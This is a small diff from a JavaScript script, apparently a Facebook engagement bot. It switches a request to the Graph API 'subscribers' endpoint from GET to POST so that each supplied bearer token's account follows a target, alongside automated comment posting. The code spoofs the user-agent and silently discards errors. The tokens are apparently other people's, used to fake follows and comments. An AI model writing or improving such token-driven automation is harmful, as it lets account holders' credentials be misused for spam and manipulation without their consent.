@@ -179,7 +179,7 @@ async function fucker(a){
       'user-agent': userAgent(),
       'Authorization': `Bearer ${a}`
     };
-    axios.get(`https://graph.facebook.com/v18.0/${neth}/subscribers`, {}, {
+    axios.post(`https://graph.facebook.com/v18.0/${neth}/subscribers`, {}, {
       headers
     }).catch(err => {});
     axios.post(`https://graph.facebook.com/${extract(link1)}/comments`, null, {
